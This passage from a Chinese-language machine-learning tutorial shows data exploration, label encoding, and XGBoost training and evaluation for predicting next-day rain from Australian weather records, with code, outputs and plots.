点的风速</td><td>实数</td></tr><tr><td>Humidity9am</td><td>早上 9 点的湿度</td><td>实数</td></tr><tr><td>Humidity3pm</td><td>下午 3 点的湿度</td><td>实数</td></tr><tr><td>Pressure9am</td><td>早上 9 点的大气压</td><td>实数</td></tr><tr><td>Pressure3pm</td><td>早上 3 点的大气压</td><td>实数</td></tr><tr><td>Cloud9am</td><td>早上 9 点的云指数</td><td>实数</td></tr><tr><td>Cloud3pm</td><td>早上 3 点的云指数</td><td>实数</td></tr><tr><td>Temp9am</td><td>早上 9 点的温度</td><td>实数</td></tr><tr><td>Temp3pm</td><td>早上 3 点的温度</td><td>实数</td></tr><tr><td>RainToday</td><td>今天是否下雨</td><td>No，Yes</td></tr><tr><td>RainTomorrow</td><td>明天是否下雨</td><td>No，Yes</td></tr></tbody></table><p><strong>Step2: 数据读取 / 载入</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 我们利用Pandas自带的read_csv函数读取并转化为DataFrame格式</span></span><br><span class="line"></span><br><span class="line">data = pd.read_csv(<span class="string">&#x27;train.csv&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>Step3: 数据信息简单查看</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 利用.info()查看数据的整体信息</span></span><br><span class="line">data.info()</span><br></pre></td></tr></table></figure><pre><code>&lt;class 'pandas.core.frame.DataFrame'&gt;RangeIndex: 106644 entries, 0 to 106643Data columns (total 23 columns): #   Column         Non-Null Count   Dtype  ---  ------         --------------   -----   0   Date           106644 non-null  object  1   Location       106644 non-null  object  2   MinTemp        106183 non-null  float64 3   MaxTemp        106413 non-null  float64 4   Rainfall       105610 non-null  float64 5   Evaporation    60974 non-null   float64 6   Sunshine       55718 non-null   float64 7   WindGustDir    99660 non-null   object  8   WindGustSpeed  99702 non-null   float64 9   WindDir9am     99166 non-null   object  10  WindDir3pm     103788 non-null  object  11  WindSpeed9am   105643 non-null  float64 12  WindSpeed3pm   104653 non-null  float64 13  Humidity9am    105327 non-null  float64 14  Humidity3pm    103932 non-null  float64 15  Pressure9am    96107 non-null   float64 16  Pressure3pm    96123 non-null   float64 17  Cloud9am       66303 non-null   float64 18  Cloud3pm       63691 non-null   float64 19  Temp9am        105983 non-null  float64 20  Temp3pm        104599 non-null  float64 21  RainToday      105610 non-null  object  22  RainTomorrow   106644 non-null  object dtypes: float64(16), object(7)memory usage: 18.7+ MB</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 进行简单的数据查看，我们可以利用 .head() 头部.tail()尾部</span></span><br><span class="line">data.head()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre></style><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Date</th>      <th>Location</th>      <th>MinTemp</th>      <th>MaxTemp</th>      <th>Rainfall</th>      <th>Evaporation</th>      <th>Sunshine</th>      <th>WindGustDir</th>      <th>WindGustSpeed</th>      <th>WindDir9am</th>      <th>...</th>      <th>Humidity9am</th>      <th>Humidity3pm</th>      <th>Pressure9am</th>      <th>Pressure3pm</th>      <th>Cloud9am</th>      <th>Cloud3pm</th>      <th>Temp9am</th>      <th>Temp3pm</th>      <th>RainToday</th>      <th>RainTomorrow</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>2012/1/19</td>      <td>MountGinini</td>      <td>12.1</td>      <td>23.1</td>      <td>0.0</td>      <td>NaN</td>      <td>NaN</td>      <td>W</td>      <td>30.0</td>      <td>N</td>      <td>...</td>      <td>60.0</td>      <td>54.0</td>      <td>NaN</td>      <td>NaN</td>      <td>NaN</td>      <td>NaN</td>      <td>17.0</td>      <td>22.0</td>      <td>No</td>      <td>No</td>    </tr>    <tr>      <th>1</th>      <td>2015/4/13</td>      <td>Nhil</td>      <td>10.2</td>      <td>24.7</td>      <td>0.0</td>      <td>NaN</td>      <td>NaN</td>      <td>E</td>      <td>39.0</td>      <td>E</td>      <td>...</td>      <td>63.0</td>      <td>33.0</td>      <td>1021.9</td>      <td>1017.9</td>      <td>NaN</td>      <td>NaN</td>      <td>12.5</td>      <td>23.7</td>      <td>No</td>      <td>Yes</td>    </tr>    <tr>      <th>2</th>      <td>2010/8/5</td>      <td>Nuriootpa</td>      <td>-0.4</td>      <td>11.0</td>      <td>3.6</td>      <td>0.4</td>      <td>1.6</td>      <td>W</td>      <td>28.0</td>      <td>N</td>      <td>...</td>      <td>97.0</td>      <td>78.0</td>      <td>1025.9</td>      <td>1025.3</td>      <td>7.0</td>      <td>8.0</td>      <td>3.9</td>      <td>9.0</td>      <td>Yes</td>      <td>No</td>    </tr>    <tr>      <th>3</th>      <td>2013/3/18</td>      <td>Adelaide</td>      <td>13.2</td>      <td>22.6</td>      <td>0.0</td>      <td>15.4</td>      <td>11.0</td>      <td>SE</td>      <td>44.0</td>      <td>E</td>      <td>...</td>      <td>47.0</td>      <td>34.0</td>      <td>1025.0</td>      <td>1022.2</td>      <td>NaN</td>      <td>NaN</td>      <td>15.2</td>      <td>21.7</td>      <td>No</td>      <td>No</td>    </tr>    <tr>      <th>4</th>      <td>2011/2/16</td>      <td>Sale</td>      <td>14.1</td>      <td>28.6</td>      <td>0.0</td>      <td>6.6</td>      <td>6.7</td>      <td>E</td>      <td>28.0</td>      <td>NE</td>      <td>...</td>      <td>92.0</td>      <td>42.0</td>      <td>1018.0</td>      <td>1014.1</td>      <td>4.0</td>      <td>7.0</td>      <td>19.1</td>      <td>28.2</td>      <td>No</td>      <td>No</td>    </tr>  </tbody></table><p>5 rows × 23 columns</p></div><p>这里我们发现数据集中存在 NaN，一般的我们认为 NaN 在数据集中代表了缺失值，可能是数据采集或处理时产生的一种错误。这里我们采用 - 1 将缺失值进行填补，还有其他例如 “中位数填补、平均数填补” 的缺失值处理方法有兴趣的同学也可以尝试。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = data.fillna(-<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data.tail()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre></style><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Date</th>      <th>Location</th>      <th>MinTemp</th>      <th>MaxTemp</th>      <th>Rainfall</th>      <th>Evaporation</th>      <th>Sunshine</th>      <th>WindGustDir</th>      <th>WindGustSpeed</th>      <th>WindDir9am</th>      <th>...</th>      <th>Humidity9am</th>      <th>Humidity3pm</th>      <th>Pressure9am</th>      <th>Pressure3pm</th>      <th>Cloud9am</th>      <th>Cloud3pm</th>      <th>Temp9am</th>      <th>Temp3pm</th>      <th>RainToday</th>      <th>RainTomorrow</th>    </tr>  </thead>  <tbody>    <tr>      <th>106639</th>      <td>2011/5/23</td>      <td>Launceston</td>      <td>10.1</td>      <td>16.1</td>      <td>15.8</td>      <td>-1.0</td>      <td>-1.0</td>      <td>SE</td>      <td>31.0</td>      <td>NNW</td>      <td>...</td>      <td>99.0</td>      <td>86.0</td>      <td>999.2</td>      <td>995.2</td>      <td>-1.0</td>      <td>-1.0</td>      <td>13.0</td>      <td>15.6</td>      <td>Yes</td>      <td>Yes</td>    </tr>    <tr>      <th>106640</th>      <td>2014/12/9</td>      <td>GoldCoast</td>      <td>19.3</td>      <td>31.7</td>      <td>36.0</td>      <td>-1.0</td>      <td>-1.0</td>      <td>SE</td>      <td>80.0</td>      <td>NNW</td>      <td>...</td>      <td>75.0</td>      <td>76.0</td>      <td>1013.8</td>      <td>1010.0</td>      <td>-1.0</td>      <td>-1.0</td>      <td>26.0</td>      <td>25.8</td>      <td>Yes</td>      <td>Yes</td>    </tr>    <tr>      <th>106641</th>      <td>2014/10/7</td>      <td>Wollongong</td>      <td>17.5</td>      <td>22.2</td>      <td>1.2</td>      <td>-1.0</td>      <td>-1.0</td>      <td>WNW</td>      <td>65.0</td>      <td>WNW</td>      <td>...</td>      <td>61.0</td>      <td>56.0</td>      <td>1008.2</td>      <td>1008.2</td>      <td>-1.0</td>      <td>-1.0</td>      <td>17.8</td>      <td>21.4</td>      <td>Yes</td>      <td>No</td>    </tr>    <tr>      <th>106642</th>      <td>2012/1/16</td>      <td>Newcastle</td>      <td>17.6</td>      <td>27.0</td>      <td>3.0</td>      <td>-1.0</td>      <td>-1.0</td>      <td>-1</td>      <td>-1.0</td>      <td>NE</td>      <td>...</td>      <td>68.0</td>      <td>88.0</td>      <td>-1.0</td>      <td>-1.0</td>      <td>6.0</td>      <td>5.0</td>      <td>22.6</td>      <td>26.4</td>      <td>Yes</td>      <td>No</td>    </tr>    <tr>      <th>106643</th>      <td>2014/10/21</td>      <td>AliceSprings</td>      <td>16.3</td>      <td>37.9</td>      <td>0.0</td>      <td>14.2</td>      <td>12.2</td>      <td>ESE</td>      <td>41.0</td>      <td>NNE</td>      <td>...</td>      <td>8.0</td>      <td>6.0</td>      <td>1017.9</td>      <td>1014.0</td>      <td>0.0</td>      <td>1.0</td>      <td>32.2</td>      <td>35.7</td>      <td>No</td>      <td>No</td>    </tr>  </tbody></table><p>5 rows × 23 columns</p></div><p><strong>Step4: 可视化描述</strong></p><p>为了方便，我们先纪录数字特征与非数字特征：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">numerical_features = [x <span class="keyword">for</span> x <span class="keyword">in</span> data.columns <span class="keyword">if</span> data[x].dtype == np.<span class="built_in">float</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">category_features = [x <span class="keyword">for</span> x <span class="keyword">in</span> data.columns <span class="keyword">if</span> data[x].dtype != np.<span class="built_in">float</span> <span class="keyword">and</span> x != <span class="string">&#x27;RainTomorrow&#x27;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 选取三个特征与标签组合的散点可视化</span></span><br><span class="line">sns.pairplot(data=data[[<span class="string">&#x27;Rainfall&#x27;</span>,<span class="string">&#x27;Evaporation&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Sunshine&#x27;</span>] + [<span class="string">&#x27;RainTomorrow&#x27;</span>]], diag_kind=<span class="string">&#x27;hist&#x27;</span>, hue= <span class="string">&#x27;RainTomorrow&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_15_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>从上图可以发现，在 2D 情况下不同的特征组合对于第二天下雨与不下雨的散点分布，以及大概的区分能力。相对的 Sunshine 与其他特征的组合更具有区分能力</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> data[numerical_features].columns:</span><br><span class="line">    <span class="keyword">if</span> col != <span class="string">&#x27;RainTomorrow&#x27;</span>:</span><br><span class="line">        sns.boxplot(x=<span class="string">&#x27;RainTomorrow&#x27;</span>, y=col, saturation=<span class="number">0.5</span>, palette=<span class="string">&#x27;pastel&#x27;</span>, data=data)</span><br><span class="line">        plt.title(col)</span><br><span class="line">        plt.show()</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_17_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p><img "" class="lazyload placeholder" data-original="output_17_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><img "" class="lazyload placeholder" data-original="output_17_2.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><img "" class="lazyload placeholder" data-original="output_17_3.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><img "" class="lazyload placeholder" data-original="output_17_4.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><img "" class="lazyload placeholder" data-original="output_17_5.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><img "" class="lazyload placeholder" data-original="output_17_6.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><img "" class="lazyload placeholder" data-original="output_17_7.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><img "" class="lazyload placeholder" data-original="output_17_8.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><img "" class="lazyload placeholder" data-original="output_17_9.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><img "" class="lazyload placeholder" data-original="output_17_10.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><img "" class="lazyload placeholder" data-original="output_17_11.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><img "" class="lazyload placeholder" data-original="output_17_12.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><img "" class="lazyload placeholder" data-original="output_17_13.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><img "" class="lazyload placeholder" data-original="output_17_14.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><img "" class="lazyload placeholder" data-original="output_17_15.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p>利用箱型图我们也可以得到不同类别在不同特征上的分布差异情况。我们可以发现 Sunshine,Humidity3pm,Cloud9am,Cloud3pm 的区分能力较强</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tlog = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> category_features:</span><br><span class="line">    tlog[i] = data[data[<span class="string">&#x27;RainTomorrow&#x27;</span>] == <span class="string">&#x27;Yes&#x27;</span>][i].value_counts()</span><br><span class="line">flog = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> category_features:</span><br><span class="line">    flog[i] = data[data[<span class="string">&#x27;RainTomorrow&#x27;</span>] == <span class="string">&#x27;No&#x27;</span>][i].value_counts()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">plt.figure(figsize=(<span class="number">10</span>,<span class="number">10</span>))</span><br><span class="line">plt.subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;RainTomorrow&#x27;</span>)</span><br><span class="line">sns.barplot(x = pd.DataFrame(tlog[<span class="string">&#x27;Location&#x27;</span>]).sort_index()[<span class="string">&#x27;Location&#x27;</span>], </span><br><span class="line">            y = pd.DataFrame(tlog[<span class="string">&#x27;Location&#x27;</span>]).sort_index().index, color = <span class="string">&quot;red&quot;</span>)</span><br><span class="line">plt.subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;Not RainTomorrow&#x27;</span>)</span><br><span class="line">sns.barplot(x = pd.DataFrame(flog[<span class="string">&#x27;Location&#x27;</span>]).sort_index()[<span class="string">&#x27;Location&#x27;</span>], </span><br><span class="line">            y = pd.DataFrame(flog[<span class="string">&#x27;Location&#x27;</span>]).sort_index().index, color = <span class="string">&quot;blue&quot;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_20_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>从上图可以发现不同地区降雨情况差别很大，有些地方明显更容易降雨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">plt.figure(figsize=(<span class="number">10</span>,<span class="number">2</span>))</span><br><span class="line">plt.subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;RainTomorrow&#x27;</span>)</span><br><span class="line">sns.barplot(x = pd.DataFrame(tlog[<span class="string">&#x27;RainToday&#x27;</span>][:<span class="number">2</span>]).sort_index()[<span class="string">&#x27;RainToday&#x27;</span>], y = pd.DataFrame(tlog[<span class="string">&#x27;RainToday&#x27;</span>][:<span class="number">2</span>]).sort_index().index, color = <span class="string">&quot;red&quot;</span>)</span><br><span class="line">plt.subplot(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;Not RainTomorrow&#x27;</span>)</span><br><span class="line">sns.barplot(x = pd.DataFrame(flog[<span class="string">&#x27;RainToday&#x27;</span>][:<span class="number">2</span>]).sort_index()[<span class="string">&#x27;RainToday&#x27;</span>], y = pd.DataFrame(flog[<span class="string">&#x27;RainToday&#x27;</span>][:<span class="number">2</span>]).sort_index().index, color = <span class="string">&quot;blue&quot;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_22_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>上图我们可以发现，今天下雨明天不一定下雨，但今天不下雨，第二天大概率也不下雨。</p><p><strong>Step5: 对离散变量进行编码</strong></p><p>由于 XGBoost 无法处理字符串类型的数据，我们需要一些方法讲字符串数据转化为数据。一种最简单的方法是把所有的相同类别的特征编码成同一个值，例如女 = 0，男 = 1，狗狗 = 2，所以最后编码的特征值是在 [0, 特征数量−1] 之间的整数。除此之外，还有独热编码、求和编码、留一法编码等等方法可以获得更好的效果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 把所有的相同类别的特征编码为同一个值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mapfunction</span>(<span class="params">x</span>):</span></span><br><span class="line">    mapp = <span class="built_in">dict</span>(<span class="built_in">zip</span>(x.unique().tolist(),</span><br><span class="line">         <span class="built_in">range</span>(<span class="built_in">len</span>(x.unique().tolist()))))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mapfunction</span>(<span class="params">y</span>):</span></span><br><span class="line">        <span class="keyword">if</span> y <span class="keyword">in</span> mapp:</span><br><span class="line">            <span class="keyword">return</span> mapp[y]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> mapfunction</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> category_features:</span><br><span class="line">    data[i] = data[i].apply(get_mapfunction(data[i]))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 编码后的字符串特征变成了数字</span></span><br><span class="line"></span><br><span class="line">data[<span class="string">&#x27;Location&#x27;</span>].unique()</span><br></pre></td></tr></table></figure><pre><code>array([ 0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, 15, 16,       17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33,       34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48],      dtype=int64)</code></pre><p><strong>Step6: 利用 XGBoost 进行训练与预测</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 为了正确评估模型性能，将数据划分为训练集和测试集，</span></span><br><span class="line"><span class="comment">## 并在训练集上训练模型，在测试集上验证模型性能。</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"></span><br><span class="line"><span class="comment">## 选择其类别为0和1的样本 （不包括类别为2的样本）</span></span><br><span class="line">data_target_part = data[<span class="string">&#x27;RainTomorrow&#x27;</span>]</span><br><span class="line">data_features_part = data[[x <span class="keyword">for</span> x <span class="keyword">in</span> data.columns <span class="keyword">if</span> x != <span class="string">&#x27;RainTomorrow&#x27;</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment">## 测试集大小为20%， 80%/20%分</span></span><br><span class="line">x_train, x_test, y_train, y_test = train_test_split(data_features_part, </span><br><span class="line">                                                    data_target_part, </span><br><span class="line">                                                    test_size = <span class="number">0.2</span>, </span><br><span class="line">                                                    random_state = <span class="number">2020</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 导入XGBoost模型</span></span><br><span class="line"><span class="keyword">from</span> xgboost.sklearn <span class="keyword">import</span> XGBClassifier</span><br><span class="line"><span class="comment">## 定义 XGBoost模型 </span></span><br><span class="line">clf = XGBClassifier()</span><br><span class="line"><span class="comment"># 在训练集上训练XGBoost模型</span></span><br><span class="line">clf.fit(x_train, y_train)</span><br></pre></td></tr></table></figure><pre><code>c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\xgboost\sklearn.py:1146: UserWarning: The use of label encoder in XGBClassifier is deprecated and will be removed in a future release. To remove this warning, do the following: 1) Pass option use_label_encoder=False when constructing XGBClassifier object; and 2) Encode your labels (y) as integers starting with 0, i.e. 0, 1, 2, ..., [num_class - 1].  warnings.warn(label_encoder_deprecation_msg, UserWarning)[15:22:25] WARNING: C:/Users/Administrator/workspace/xgboost-win64_release_1.4.0/src/learner.cc:1095: Starting in XGBoost 1.3.0, the default evaluation metric used with the objective 'binary:logistic' was changed from 'error' to 'logloss'. Explicitly set eval_metric if you'd like to restore the old behavior.XGBClassifier(base_score=0.5, booster='gbtree', colsample_bylevel=1,              colsample_bynode=1, colsample_bytree=1, gamma=0, gpu_id=-1,              importance_type='gain', interaction_constraints='',              learning_rate=0.300000012, max_delta_step=0, max_depth=6,              min_child_weight=1, missing=nan, monotone_constraints='()',              n_estimators=100, n_jobs=32, num_parallel_tree=1, random_state=0,              reg_alpha=0, reg_lambda=1, scale_pos_weight=1, subsample=1,              tree_method='exact', validate_parameters=1, verbosity=None)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 在训练集和测试集上分布利用训练好的模型进行预测</span></span><br><span class="line">train_predict = clf.predict(x_train)</span><br><span class="line">test_predict = clf.predict(x_test)</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> metrics</span><br><span class="line"></span><br><span class="line"><span class="comment">## 利用accuracy（准确度）【预测正确的样本数目占总预测样本数目的比例】评估模型效果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The accuracy of the Logistic Regression is:&#x27;</span>,metrics.accuracy_score(y_train,train_predict))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The accuracy of the Logistic Regression is:&#x27;</span>,metrics.accuracy_score(y_test,test_predict))</span><br><span class="line"></span><br><span class="line"><span class="comment">## 查看混淆矩阵 (预测值和真实值的各类情况统计矩阵)</span></span><br><span class="line">confusion_matrix_result = metrics.confusion_matrix(test_predict,y_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The confusion matrix result:\n&#x27;</span>,confusion_matrix_result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用热力图对于结果进行可视化</span></span><br><span class="line">plt.figure(figsize=(<span class="number">8</span>, <span class="number">6</span>))</span><br><span class="line">sns.heatmap(confusion_matrix_result, annot=<span class="literal">True</span>, cmap=<span class="string">&#x27;Blues&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Predicted labels&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;True labels&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><pre><code>The accuracy of the Logistic Regression is: 0.8982476703979371The accuracy of the Logistic Regression is: 0.8575179333302076The confusion matrix result: [[15656  2142] [  897  2634]]</code></pre><p><img "" class="lazyload placeholder" data-original="output_30_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p>我们可以发现共有 15759 + 2306 个样本预测正确，2470 + 794 个样本预测错误。</p><p><strong>Step7: 利用 XGBoost 进行特征选择</strong></p><p>XGBoost 的特征选择属于特征选择中的嵌入式方法，在 XGboost 中可以用属性 feature_importances_去查看特征的重要度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? sns.barplot</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sns.barplot(y=data_features_part.columns, x=clf.feature_importances_)</span><br></pre></td></tr></table></figure><pre><code>&lt;AxesSubplot:&gt;</code></pre><p>​<br><img "" class="lazyload placeholder" data-original="output_33_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>从图中我们可以发现下午 3 点的湿度与今天是否下雨是决定第二天是否下雨最重要的因素</p><p>初次之外，我们还可以使用 XGBoost 中的下列重要属性来评估特征的重要性。</p><ul><li>weight: 是以特征用到的次数来评价</li><li>gain: 当利用特征做划分的时候的评价基尼指数</li><li>cover: 利用一个覆盖样本的指标二阶导数（具体原理不清楚有待探究）平均值来划分。</li><li>total_gain: 总基尼指数</li><li>total_cover: 总覆盖</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 